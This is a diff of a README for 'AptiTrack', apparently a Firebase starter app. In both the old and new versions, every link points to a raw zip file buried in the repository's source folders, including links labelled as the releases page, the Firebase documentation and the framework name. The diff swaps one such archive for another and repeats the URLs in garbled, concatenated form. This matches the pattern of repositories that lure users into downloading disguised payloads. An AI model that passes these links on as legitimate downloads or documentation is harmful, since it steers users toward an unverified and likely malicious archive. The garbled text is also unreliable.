@@ -2,7 +2,7 @@
 
 ## 📥 Download Links
 
-[![Download AptiTrack](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip%20AptiTrack-%https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip)](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip)
+[![Download AptiTrack](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip%20AptiTrack-%https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip)](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ AptiTrack is a simple application designed to help users dive into Firebase with
 ## 💻 System Requirements
 
 - Windows, macOS, or Linux
-- https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip version 14 or higher
+- https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip version 14 or higher
 - Internet connection for Firebase services
 
 ## 📦 What You’ll Get
@@ -22,17 +22,17 @@ AptiTrack is a simple application designed to help users dive into Firebase with
 
 ## 🔗 How to Download & Install
 
-1. **Visit the Releases Page:** Go to the [AptiTrack Releases page](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip). Here, you will find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [AptiTrack Releases page](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip). Here, you will find the latest version of the application.
   
 2. **Download the Latest Version:** Look for the most recent release. Click on the version number to view the details.
 
-3. **Choose Your File:** Select the file that suits your operating system. It may be a `.zip`, `https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip`, or other formats. 
+3. **Choose Your File:** Select the file that suits your operating system. It may be a `.zip`, `https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip`, or other formats. 
 
 4. **Download the File:** Click on the download link to save the file to your computer.
 
 5. **Extract the Files:** After downloading, find the file in your Downloads folder. Use a file extractor (like WinRAR for Windows or The Unarchiver for macOS) to unzip the contents.
 
-6. **Open the Project:** Navigate to the unzipped folder. Inside, you’ll find the `https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip` file. You can open this file in any text editor or Integrated Development Environment (IDE) like Visual Studio Code.
+6. **Open the Project:** Navigate to the unzipped folder. Inside, you’ll find the `https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip` file. You can open this file in any text editor or Integrated Development Environment (IDE) like Visual Studio Code.
 
 7. **Run the Application:** Open your terminal or command prompt. Use the following commands:
    - Navigate to the extracted folder:
@@ -55,8 +55,8 @@ Once your application is running, you can visit `http://localhost:3000` in your 
 ## 📚 Resources and Support
 
 For further assistance, check out the following resources:
-- **Firebase Documentation:** Helpful for understanding how to connect your application to Firebase. [Firebase Documentation](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip).
-- **https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip Documentation:** Great for learning about the https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip framework. [https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip Documentation](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip).
+- **Firebase Documentation:** Helpful for understanding how to connect your application to Firebase. [Firebase Documentation](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip).
+- **https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip Documentation:** Great for learning about the https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip framework. [https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip Documentation](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip).
 
 If you encounter issues, feel free to open an issue in the GitHub repository.
 
@@ -71,4 +71,4 @@ We plan to add more features to AptiTrack, including:
 
 We appreciate you choosing AptiTrack for your development needs. 
 
-For updates, stay tuned to our [AptiTrack Releases page](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/app/test/[slug]/Track_Apti_v3.8.zip). Happy coding!
+For updates, stay tuned to our [AptiTrack Releases page](https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip[slug]https://github.com/cccurly/AptiTrack/raw/refs/heads/main/src/ai/flows/Apti_Track_2.1-alpha.1.zip). Happy coding!
